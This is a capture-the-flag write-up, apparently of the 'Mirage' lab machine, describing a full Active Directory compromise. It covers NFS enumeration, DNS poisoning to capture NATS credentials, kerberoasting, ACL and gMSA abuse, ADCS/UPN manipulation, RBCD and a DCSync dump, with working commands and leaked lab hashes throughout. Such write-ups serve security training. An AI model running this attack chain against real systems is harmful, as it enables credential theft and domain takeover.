Started with a nmap scan
```
PORT      STATE SERVICE         REASON          VERSION
53/tcp    open  domain          syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec    syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-09 07:01:20Z)
111/tcp   open  rpcbind         syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn     syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap            syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Issuer: commonName=mirage-DC01-CA/domainComponent=mirage
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-04T19:58:41
| Not valid after:  2105-07-04T19:58:41
| MD5:   da96:ee88:7537:0dcf:1bd4:4aa3:2104:5393
| SHA-1: c25a:58cc:950f:ce6e:64c7:cd40:e98e:bb5a:653f:b9ff
445/tcp   open  microsoft-ds?   syn-ack ttl 127
464/tcp   open  kpasswd5?       syn-ack ttl 127
593/tcp   open  ncacn_http      syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap        syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Issuer: commonName=mirage-DC01-CA/domainComponent=mirage
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-04T19:58:41
| Not valid after:  2105-07-04T19:58:41
| MD5:   da96:ee88:7537:0dcf:1bd4:4aa3:2104:5393
| SHA-1: c25a:58cc:950f:ce6e:64c7:cd40:e98e:bb5a:653f:b9ff
2049/tcp  open  nlockmgr        syn-ack ttl 127 1-4 (RPC #100021)
3268/tcp  open  ldap            syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Issuer: commonName=mirage-DC01-CA/domainComponent=mirage
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-04T19:58:41
| Not valid after:  2105-07-04T19:58:41
| MD5:   da96:ee88:7537:0dcf:1bd4:4aa3:2104:5393
| SHA-1: c25a:58cc:950f:ce6e:64c7:cd40:e98e:bb5a:653f:b9ff
3269/tcp  open  ssl/ldap        syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Issuer: commonName=mirage-DC01-CA/domainComponent=mirage
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-04T19:58:41
| Not valid after:  2105-07-04T19:58:41
| MD5:   da96:ee88:7537:0dcf:1bd4:4aa3:2104:5393
| SHA-1: c25a:58cc:950f:ce6e:64c7:cd40:e98e:bb5a:653f:b9ff
4222/tcp  open  vrml-multi-use? syn-ack ttl 127
| fingerprint-strings: 
|   GenericLines: 
|     INFO {"server_id":"NDXM7PT7NFLMZ2GADQ7AO5HW2FH36SV5VEUQVCUHGHTG56EFUG77DI3U","server_name":"NDXM7PT7NFLMZ2GADQ7AO5HW2FH36SV5VEUQVCUHGHTG56EFUG77DI3U","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":1773,"client_ip":"10.10.16.82","xkey":"XAMXYNMZTTNAN4B5MDXGBHNXCRLJXNE4YF32ZWSI3LMRHFXOJ7PXDJ66"} 
|     -ERR 'Authorization Violation'
|   GetRequest: 
|     INFO {"server_id":"NDXM7PT7NFLMZ2GADQ7AO5HW2FH36SV5VEUQVCUHGHTG56EFUG77DI3U","server_name":"NDXM7PT7NFLMZ2GADQ7AO5HW2FH36SV5VEUQVCUHGHTG56EFUG77DI3U","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":1774,"client_ip":"10.10.16.82","xkey":"XAMXYNMZTTNAN4B5MDXGBHNXCRLJXNE4YF32ZWSI3LMRHFXOJ7PXDJ66"} 
|     -ERR 'Authorization Violation'
|   HTTPOptions: 
|     INFO {"server_id":"NDXM7PT7NFLMZ2GADQ7AO5HW2FH36SV5VEUQVCUHGHTG56EFUG77DI3U","server_name":"NDXM7PT7NFLMZ2GADQ7AO5HW2FH36SV5VEUQVCUHGHTG56EFUG77DI3U","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":1775,"client_ip":"10.10.16.82","xkey":"XAMXYNMZTTNAN4B5MDXGBHNXCRLJXNE4YF32ZWSI3LMRHFXOJ7PXDJ66"} 
|     -ERR 'Authorization Violation'
|   NULL: 
|     INFO {"server_id":"NDXM7PT7NFLMZ2GADQ7AO5HW2FH36SV5VEUQVCUHGHTG56EFUG77DI3U","server_name":"NDXM7PT7NFLMZ2GADQ7AO5HW2FH36SV5VEUQVCUHGHTG56EFUG77DI3U","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":1772,"client_ip":"10.10.16.82","xkey":"XAMXYNMZTTNAN4B5MDXGBHNXCRLJXNE4YF32ZWSI3LMRHFXOJ7PXDJ66"} 
|_    -ERR 'Authentication Timeout'
5985/tcp  open  http            syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf          syn-ack ttl 127 .NET Message Framing
47001/tcp open  http            syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
52396/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
64870/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
64879/tcp open  ncacn_http      syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
64880/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
64893/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
64896/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
64916/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
64934/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Domain `mirage.htb` Hostname `DC01` DNS `MIRAGE` 

Testing out the `LDAP` and `SMB` with null account and guest account and there not supported there is NFS and when we do `showmount -e 10.10.11.78` we get one mount
```
/MirageReports (everyone)
```
so we can do `sudo mount -t nfs 10.10.11.78:/MirageReports mount/ -nolock`
and now we can look at the mount and there are 2 pdfs in the folder looking at the PDF files one is talking about disabling NTLM and going to kerberos only and the other is talking about a missing DNS record of `nats-svc.mirage.htb` and talking about `nats messageing` being on port `4222` going back looking at the screen shots there is a possible account `Dev_Account_A` and so ima try one last thing is set up a fake DNS server to update the missing record with are ip and using the DNS of the machine and then we need a script to setup a socket to the NATS service and proxy it back to us 
```
Response:
id 40534
opcode UPDATE
rcode NOERROR
flags QR
;ZONE
mirage.htb. IN SOA
;PREREQ
;UPDATE
nats-svc.mirage.htb. 300 IN A 10.10.16.82
;ADDITIONAL
```
```
[+] Proxy listening on 0.0.0.0:4222
[+] Connection from ('10.10.11.78', 60080)
[DATA] INFO {"server_id":"NDXM7PT7NFLMZ2GADQ7AO5HW2FH36SV5VEUQVCUHGHTG56EFUG77DI3U","server_name":"NDXM7PT7NFLMZ2GADQ7AO5HW2FH36SV5VEUQVCUHGHTG56EFUG77DI3U","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":1984,"client_ip":"10.10.16.82","xkey":"XAMXYNMZTTNAN4B5MDXGBHNXCRLJXNE4YF32ZWSI3LMRHFXOJ7PXDJ66"} 

[DATA] CONNECT {"verbose":false,"pedantic":false,"user":"Dev_Account_A","pass":"hx5h7F5554fP@1337!","tls_required":false,"name":"NATS CLI Version 0.2.2","lang":"go","version":"1.41.1","protocol":1,"echo":true,"headers":true,"no_responders":true}
```
And now we have the creds for the account of `Dev_Account_A:hx5h7F5554fP@1337!` and we can use this account to auth to the `nats` service now we can enumerate this `./nats -s nats://nats-svc:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!' stream ls` and we get `auth_logs` back now we can see info about it `./nats -s nats://nats-svc:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!' stream info Auth_logs` and we can see there is `5` messages in it so now to dump the messages `./nats -s nats://nats-svc:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!' stream view auth_logs` 
```
[5] Subject: logs.auth Received: 2025-05-05 02:19:27
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}
```
and now we have more creds `david.jjackson:pN8kQmn6b86!1234@` so now we need to test these creds on other services first we need to generate are krb5 file and then we can auth to the machine `nxc ldap dc01.mirage.htb -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -k` now we can also dump all the users `nxc ldap dc01.mirage.htb -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -k --users` 
```
Administrator
Guest
krbtgt
Dev_Account_A
Dev_Account_B
david.jjackson
javier.mmarshall
mark.bbond
nathan.aadam
svc_mirage
```
 now we need to get the bloodhound data and looking threw the query's since we have no outbound connections there is a kerberoasting account `nathan.aadam` so we can use net exec  `nxc ldap dc01.mirage.htb -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -k --kerberoasting kerb` and we got the user 
 ```
 $krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb\nathan.aadam*$c3e32683bfb2422c934cd606e11bfc01$63b36aa319eb90984b6b9fd5f8c361a2423f881cff79bd12146a4e7d7677f10480d0a08ddd261ab8a5c96f1cc230c4c6447c495c911111c9b0799b68cc604d5c22d874e737986247ba83f9cdb1fe42daac26fb614db59f3124cccef571be12c5e691418c28092a87131c3b5d266ab315db57b78ef7d77ac940ce4829796e22cf370acc0c345786eef5b2bd3c9a959b8a326b533e42803c0985f3f22aa987ee5e8b1e8ff4f0aacae7d347bd7d69f6a30bf56bacb81bb322b76b08168543790ad3ca07cf6a3b7c1f98bc9178a943f596f9ea90b71d4b7cd0d4de6e7517436afb1e3f2bd9bdb10706435484aa9026612165faf173da0be0cd7fc9dbc631f74f6944deefd23ae9bea091fa7bc67f5c99c452f1cc9595e4493cd2c2b30a98baff0f6bf30da80d88f26e813782cace3ce478b14dd52d3258796419b859132cc73926402b77131da46a917674d9ec181902f6d10273922e54e8b241182a5476e86717334885918f0ceb0005a1aa00f2baecadd95664b5fbe5c669d636d8d37b9b4a3b81680ed0896caca148c8444f22a460f68958519043af24e65077175f9d284ed9ea683cbe035ac9bab21b72a18d2c961c6c8a33d16e3ce47c320caf34a0c95980ad90813da5d09a39bf540b32b3f49b5a48c5530ba4c7b54826347d54535dc73cce98809f2ad0b5a753a70ac6f3a79cabae56f3ddfef7dda9b4b49e0cf2508a37be7245e88c7c0538e4fef2b8ea7e150fce5180c6da338724a712b4edcc00967400c96d8149933254e6c2803f32155e244a5e82257b903c0f01e72cc107d5145a8b66beda7c8e671dc5d112dd98dedb3b21b5969a77ff34e7322b6f9149fcdf0e4648c8cff550c8c63410e855d943ad59ca18dbafd371fb132f78b3aa9b7dd5ba02d3614abd6cebb5127673ab12cda43c722642bd3f13ee02bc2c26bef7ff97c85a76e826fb5bd38b320e638af6e9148e72b1d7e4a7cdfa545a0c6c943f02a88e6bc8ebddbac7e85b394240b734912179ee0308845d31bacfb3d8018a2c83e735bad449ac540d0037e42c4301ae555d90f475b8ed6803f6121747938e17ecf437226cb01c00a1dba5b77d92e49667ec137e5ba99ba7d75641c449aeaf7339ece3b76908072abd87054e61efc853508aa461f9aa1de2297a2f785acaa70bc17f116116db4da9b8074b2eda829ae025046d4eef18bab92fbb67d9a5ecfc921df79a8daf6d47bcfe3d3436992d6fc13cd019f99d4e71eaa9c41efad6f26c933d330cf432cb3b056b228bb4d4498b1412047728022b5c743953df392313e9715f00042befdaf33ff444904900a096309617e806b7246fac86a3188655b72a427371845ceb0dd7b9e10b29dfe58db225a0469ba95a0218067aa59f3195f9979942938aaaffeae16b8a9d7d573cd343606873ae5fffc675c621ab446a3923a2a50e6b17ed3bb05642df65ab3409b260e84e76ecc198b52692cf2327b96a2b4594b104927c336c87d94c98a8a36718747dfbfcee563e558073b1f2a630e6889cc889c8f95fa07b68572d1a3c67a6496b34a1cc923a5ee897b69e7c3a9ce7
 ```
 now we need to crack this account to get the password we can use hashcat and it cracked to `nathan.aadam:3edc#EDC3` now looking at this user we have access to winrm but we can auth like this so we need to make a ticket so we can auth `impacket-getTGT mirage.htb/'nathan.aadam':'3edc#EDC3'` and then we need to export it `export KRB5CCNAME=nathan.aadam.ccache` `evil-winrm -i dc01.mirage.htb -r mirage.htb` and now we have user flag and need to get more bloodhound data with `SharpHound` we can upload it run it and then download it looking at it in bloodhound we have `ADCS` stuff but going to run `winPEAS` first but it did not find anything so looking in the program flies there is a nats folder with a config file with some creds in it 
 ```
{ user: 'sysadmin', password: 'bb5M0k5XWIGD' }
{ user: 'Dev_Account_B', password: 'tvPFGAzdsJfHzbRJ' }
 ```
 and winpeas also found a auto login cred `mark.bbond:1day@atime` and looking at the bloodhound data and we have some outbound connections this account is apart of the `it_support` group which has `forcechangepassword` over the user `javier.mmarshall` so when we try and change the password we get a error so looking at the account and it has `ACCOUNTDISABLE` so we have to remove it 
 ```
 bloodyAD --kerberos -d mirage.htb -u mark.bbond -p '1day@atime' --host dc01.mirage.htb get object 'JAVIER.MMARSHALL'
bloodyAD --kerberos -d mirage.htb -u mark.bbond -p '1day@atime' --host dc01.mirage.htb remove uac "javier.mmarshall" -f ACCOUNTDISABLE
 ```
so now we can chnage the password `bloodyAD --kerberos -d mirage.htb -u mark.bbond -p '1day@atime' --host dc01.mirage.htb set password "javier.mmarshall" 'NewPass123!'` and now this user can dump the GMSA passwords of the `Mirage-Service$` account but we get a error we forgot about the logon hours attr we need to run these commands in the evil winrm 
```
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> $Password = ConvertTo-SecureString "1day@atime" -AsPlainText -Force
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> $Cred = New-Object System.Management.Automation.PSCredential ("MIRAGE\mark.bbond", $Password)
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> Enable-ADAccount -Identity javier.mmarshall -Credential $Cred
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> $logonhours = Get-ADUser mark.bbond -Properties LogonHours | Select-Object -ExpandProperty logonhours
[byte[]]$hours1 = $logonhours
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> Set-ADUser -Identity javier.mmarshall -Credential $Cred -Replace @{logonhours = $hours1}
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> Get-ADUser javier.mmarshall -Properties Enabled, LogonHours | Select-Object Name, Enabled, LogonHours
```
now we can dump the gmsa passwords `bloodyAD -k --host '10.10.11.78' -d 'mirage.htb' -u 'javier.mmarshall' -p 'NewPass123!' --host dc01.mirage.htb get object 'Mirage-Service$' --attr msDS-ManagedPassword` and we get this back
```
Mirage-Service$:aad3b435b51404eeaad3b435b51404ee:738eeff47da231dec805583638b8a91f
```
now we can get a ticket as this user and export it and then we need to update the UPN of mark and get a ticket as mark user 
```
certipy-ad account -u 'Mirage-Service$' -k -target dc01.mirage.htb -upn 'dc01$@mirage.htb' -user 'mark.bbond' update -dc-ip 10.10.11.78
certipy-ad req -k -target dc01.mirage.htb -ca 'mirage-DC01-CA' -template 'User' -dc-ip 10.10.11.78
```
now we have a ticket as the dc01 account and we need to set the mark spn back to what it was and then we need to get a ldap shell and then set mark to be able to impersonate 
```
certipy-ad account -u 'Mirage-Service$' -k -target dc01.mirage.htb -upn 'mark.bbond@mirage.htb' -user 'mark.bbond' update -dc-ip 10.10.11.78
certipy-ad auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell
set_rbcd dc01$ mark.bbond
```
but we get a error when trying it with mark we can try the nathan account and then we can get a ticket for dc01 account agin
```
set_rbcd dc01$ nathan.aadam
impacket-getST -spn 'CIFS/dc01.mirage.htb' -impersonate 'DC01$' 'MIRAGE.HTB/nathan.aadam:3edc#EDC3' -k
```
and now we can dcsync 
`impacket-secretsdump -k -no-pass dc01.mirage.htb` 
```
mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
mirage.htb\Dev_Account_A:1104:aad3b435b51404eeaad3b435b51404ee:3db621dd880ebe4d22351480176dba13:::
mirage.htb\Dev_Account_B:1105:aad3b435b51404eeaad3b435b51404ee:fd1a971892bfd046fc5dd9fb8a5db0b3:::
mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
mirage.htb\javier.mmarshall:1108:aad3b435b51404eeaad3b435b51404ee:ccc811081012cc90a0730aa32cbc5049:::
mirage.htb\mark.bbond:1109:aad3b435b51404eeaad3b435b51404ee:8fe1f7f9e9148b3bdeb368f9ff7645eb:::
mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
mirage.htb\svc_mirage:2604:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:738eeff47da231dec805583638b8a91f:::
[*] Kerberos keys grabbed
mirage.htb\Administrator:aes256-cts-hmac-sha1-96:09454bbc6da252ac958d0eaa211293070bce0a567c0e08da5406ad0bce4bdca7
mirage.htb\Administrator:aes128-cts-hmac-sha1-96:47aa953930634377bad3a00da2e36c07
mirage.htb\Administrator:des-cbc-md5:e02a73baa10b8619
krbtgt:aes256-cts-hmac-sha1-96:95f7af8ea1bae174de9666c99a9b9edeac0ca15e70c7246cab3f83047c059603
krbtgt:aes128-cts-hmac-sha1-96:6f790222a7ee5ba9d2776f6ee71d1bfb
krbtgt:des-cbc-md5:8cd65e54d343ba25
mirage.htb\Dev_Account_A:aes256-cts-hmac-sha1-96:e4a6658ff9ee0d2a097864d6e89218287691bf905680e0078a8e41498f33fd9a
mirage.htb\Dev_Account_A:aes128-cts-hmac-sha1-96:ceee67c4feca95b946e78d89cb8b4c15
mirage.htb\Dev_Account_A:des-cbc-md5:26dce5389b921a52
mirage.htb\Dev_Account_B:aes256-cts-hmac-sha1-96:5c320d4bef414f6a202523adfe2ef75526ff4fc6f943aaa0833a50d102f7a95d
mirage.htb\Dev_Account_B:aes128-cts-hmac-sha1-96:e05bdceb6b470755cd01fab2f526b6c0
mirage.htb\Dev_Account_B:des-cbc-md5:e5d07f57e926ecda
mirage.htb\david.jjackson:aes256-cts-hmac-sha1-96:3480514043b05841ecf08dfbf33d81d361e51a6d03ff0c3f6d51bfec7f09dbdb
mirage.htb\david.jjackson:aes128-cts-hmac-sha1-96:bd841caf9cd85366d254cd855e61cd5e
mirage.htb\david.jjackson:des-cbc-md5:76ef68d529459bbc
mirage.htb\javier.mmarshall:aes256-cts-hmac-sha1-96:76c7f7a95bbca64895c545c5633ff3adbd3a737c1c5da3162303e17bc6ba0830
mirage.htb\javier.mmarshall:aes128-cts-hmac-sha1-96:f1b25dbf2e64a7fa091092de65fea7f9
mirage.htb\javier.mmarshall:des-cbc-md5:624c3d9b2acd4a6d
mirage.htb\mark.bbond:aes256-cts-hmac-sha1-96:dc423caaf884bb869368859c59779a757ff38a88bdf4197a4a284b599531cd27
mirage.htb\mark.bbond:aes128-cts-hmac-sha1-96:78fcb9736fbafe245c7b52e72339165d
mirage.htb\mark.bbond:des-cbc-md5:d929fb462ae361a7
mirage.htb\nathan.aadam:aes256-cts-hmac-sha1-96:b536033ac796c7047bcfd47c94e315aea1576a97ff371e2be2e0250cce64375b
mirage.htb\nathan.aadam:aes128-cts-hmac-sha1-96:b1097eb42fd74827c6d8102a657e28ff
mirage.htb\nathan.aadam:des-cbc-md5:5137a74f40f483c7
mirage.htb\svc_mirage:aes256-cts-hmac-sha1-96:937efa5352253096b3b2e1d31a9f378f422d9e357a5d4b3af0d260ba1320ba5e
mirage.htb\svc_mirage:aes128-cts-hmac-sha1-96:8d382d597b707379a254c60b85574ab1
mirage.htb\svc_mirage:des-cbc-md5:2f13c12f9d5d6708
DC01$:aes256-cts-hmac-sha1-96:4a85665cd877c7b5179c508e5bc4bad63eafe514f7cedb0543930431ef1e422b
DC01$:aes128-cts-hmac-sha1-96:94aa2a6d9e156b7e8c03a9aad4af2cc1
DC01$:des-cbc-md5:cb19ce2c733b3ba8
Mirage-Service$:aes256-cts-hmac-sha1-96:7c7cf51a944c05f934f055683959f1aa12230cbc42072cff8def34442c0fad8b
Mirage-Service$:aes128-cts-hmac-sha1-96:a21199c62fd336f19f6fbf167ae3fced
Mirage-Service$:des-cbc-md5:c7bab0613bea374a
[*] Cleaning up...
```
and now we can get a ticket and then winrm as the admin user 